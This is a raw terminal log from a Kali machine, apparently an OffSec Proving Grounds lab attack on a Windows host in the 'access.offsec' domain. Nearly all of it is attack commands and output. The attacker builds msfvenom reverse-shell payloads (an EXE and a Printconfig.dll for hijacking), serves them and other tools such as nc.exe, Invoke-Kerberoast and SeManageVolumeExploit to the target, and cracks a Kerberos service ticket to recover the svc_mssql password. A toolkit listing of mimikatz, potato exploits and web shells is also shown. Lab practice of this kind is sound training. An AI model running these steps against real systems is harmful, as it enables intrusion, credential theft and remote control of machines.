@@ -1,0 +1,209 @@
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m cd ../Temp/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m vim .htaccess
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m vim pwn.png
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m set-ip 192.168.176.187
+export IP=192.168.176.187
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m export IP=192.168.176.187
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m ls -a
+[1m[34m.[0m  [1m[34m..[0m  .htaccess  [1m[35mpwn.png
+[0m┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8000 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: shell.exe
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 10:44:43] "GET /shell.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m cd ~/Common/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 10:48:04] "GET /Invoke-Kerberoast.ps1 HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m cd -
+/home/sk4t4/PG/Access/Temp
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m cd ../Loot/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m vim mssql_ticket
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m vim mssql_ticket
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m john mssql_ticket --wordlist=$rockyou
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[33mtrustno1[39m         ([33msvc_mssql[39m)
+1g 0:00:00:00 DONE (2026-06-17 10:53) 33.33g/s 34133p/s 34133c/s 34133C/s 123456..bethany
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m nxc winrm $IP -u svc_mssql -p trustno1
+[1m[34mWINRM[0m       192.168.176.187 5985   SERVER           [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 (name:SERVER) (domain:access.offsec)
+[1m[34mWINRM[0m       192.168.176.187 5985   SERVER           [1m[31m[-][0m access.offsec\svc_mssql:trustno1
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m nxc mssql $IP -u svc_mssql -p trustno1
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m nxc smb $IP -u svc_mssql -p trustno1
+[1m[34mSMB[0m         192.168.176.187 445    SERVER           [1m[34m[*][0m Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) ([1m[32msigning:True[0m) ([1m[36mSMBv1:None[0m)
+[1m[34mSMB[0m         192.168.176.187 445    SERVER           [1m[32m[+][0m access.offsec\svc_mssql:trustno1
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m nxc rdp $IP -u svc_mssql -p trustno1
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m cd ~/Common/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m ls
+ AddUser.c            GodPotato-NET35.exe     [1m[36mInvoke-Rubeus.ps1[0m   [1m[36mlinpeas.sh[0m               p0wny.php               powerup.ps1          [1m[36mPsExec.exe[0m   [1m[36mrockyou.txt[0m      SigmaPotato.exe             [1m[36mwinPEASx64.exe
+[0m [1m[32madduser.exe[0m          GodPotato-NET4.exe      kerbrute.exe        [1m[36mmedium_directories.txt[0m   [1m[36mparameters.txt[0m          [1m[36mPowerUp.ps1[0m          [1m[36mpspy32[0m       [1m[36mRubeus.exe[0m       [1m[32msocat[0m                       [1m[36mwinPEASx86.exe
+[0m AD_enum.ps1          id_ed25519              [1m[36mLFI.txt[0m             [1m[36mmimikatz_32.exe[0m          [1m[36mphp-reverse-shell.php[0m   [1m[36mPowerView.ps1[0m        [1m[36mpspy32s[0m      Seatbelt.exe     [1m[36msocat.txt[0m                   winshell.php
+ [1m[32mchisel.exe[0m           id_ed25519.pub          [1m[32mligolo.elf[0m          [1m[36mmimikatz.exe[0m             [1m[36mplink.exe[0m               PrintSpoofer64.exe   [1m[36mpspy64[0m       [1m[36mSharpHound.ps1[0m  'Template - AD.md'
+ GodPotato-NET2.exe   [1m[36mInvoke-Kerberoast.ps1[0m   [1m[32mligolo.exe[0m          [1m[36mnc.exe[0m                   [1m[36mpowercat.ps1[0m            [1m[36mPsExec64.exe[0m         [1m[36mpspy64s[0m      shell.pem       'Template - Standalone.md'
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 11:03:03] "GET /nc.exe HTTP/1.1" 200 -
+192.168.176.187 - - [17/Jun/2026 11:03:12] "GET /nc.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m mv ~/Downloads/Invoke-RunasCs.ps1 ./
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 11:12:31] code 404, message File not found
+192.168.176.187 - - [17/Jun/2026 11:12:31] "GET /Invoke-RunAsCs.ps1 HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m ls
+ AddUser.c             GodPotato-NET4.exe      kerbrute.exe             [1m[36mmimikatz_32.exe[0m         [1m[36mplink.exe[0m            [1m[36mPsExec64.exe[0m   [1m[36mrockyou.txt[0m       [1m[32msocat[0m                       winshell.php
+ [1m[32madduser.exe[0m           id_ed25519              [1m[36mLFI.txt[0m                  [1m[36mmimikatz.exe[0m            [1m[36mpowercat.ps1[0m         [1m[36mPsExec.exe[0m     [1m[36mRubeus.exe[0m        [1m[36msocat.txt[0m
+ AD_enum.ps1           id_ed25519.pub          [1m[32mligolo.elf[0m               [1m[36mnc.exe[0m                  powerup.ps1          [1m[36mpspy32[0m         Seatbelt.exe     'Template - AD.md'
+ [1m[32mchisel.exe[0m            [1m[36mInvoke-Kerberoast.ps1[0m   [1m[32mligolo.exe[0m               p0wny.php               [1m[36mPowerUp.ps1[0m          [1m[36mpspy32s[0m        [1m[36mSharpHound.ps1[0m   'Template - Standalone.md'
+ GodPotato-NET2.exe    [1m[36mInvoke-Rubeus.ps1[0m       [1m[36mlinpeas.sh[0m               [1m[36mparameters.txt[0m          [1m[36mPowerView.ps1[0m        [1m[36mpspy64[0m         shell.pem         [1m[36mwinPEASx64.exe[0m
+ GodPotato-NET35.exe   Invoke-RunasCs.ps1      [1m[36mmedium_directories.txt[0m   [1m[36mphp-reverse-shell.php[0m   PrintSpoofer64.exe   [1m[36mpspy64s[0m        SigmaPotato.exe   [1m[36mwinPEASx86.exe[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 11:12:53] "GET /Invoke-RunasCs.ps1 HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m mv ~/Downloads/*.exe ./
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m ls -tr|grep exe
+winPEASx64.[1m[31mexe[0m
+winPEASx86.[1m[31mexe[0m
+nc.[1m[31mexe[0m
+GodPotato-NET4.[1m[31mexe[0m
+GodPotato-NET35.[1m[31mexe[0m
+GodPotato-NET2.[1m[31mexe[0m
+ligolo.[1m[31mexe[0m
+chisel.[1m[31mexe[0m
+mimikatz_32.[1m[31mexe[0m
+mimikatz.[1m[31mexe[0m
+Rubeus.[1m[31mexe[0m
+kerbrute.[1m[31mexe[0m
+PsExec.[1m[31mexe[0m
+PsExec64.[1m[31mexe[0m
+plink.[1m[31mexe[0m
+Seatbelt.[1m[31mexe[0m
+adduser.[1m[31mexe[0m
+SigmaPotato.[1m[31mexe[0m
+PrintSpoofer64.[1m[31mexe[0m
+SeManageVolumeExploit.[1m[31mexe[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 11:29:55] "GET /SeManageVolumeExploit.exe HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/Common[0m]
+└─[1m[34m$[0m cd -
+/home/sk4t4/PG/Access/Loot
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Loot[0m]
+└─[1m[34m$[0m cd ../Temp/
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m msfvenom -a x64 -p windows/x64/shell_reverse_tcp -f dll -o Printconfig.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: Printconfig.dll
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+^C
+└─[1m[34m$[0m msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT= 8001
+└─[1m[34m$[0m msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT= 8001 -f dll -o Printconfig.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payloadrintconfig.dll
+Error: One or more options failed to validate: LPORT.LHOST=tun0 LPORT= 8 -f dll -o Printconfig.dll
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+dll^Csfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT= 8001 -f dll -o Printconfig.d
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m stty rows 200 columns 200
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8001 -f dll -o Printconfig.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: Printconfig.dll
+└─[1m[34m$[0m http
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.176.187 - - [17/Jun/2026 11:42:10] "GET /Printconfig.dll HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+┌──([1m[32msk4t4㉿ThinkPadKali[0m)-[[1m~/PG/Access/Temp[0m]
+└─[1m[34m$[0m
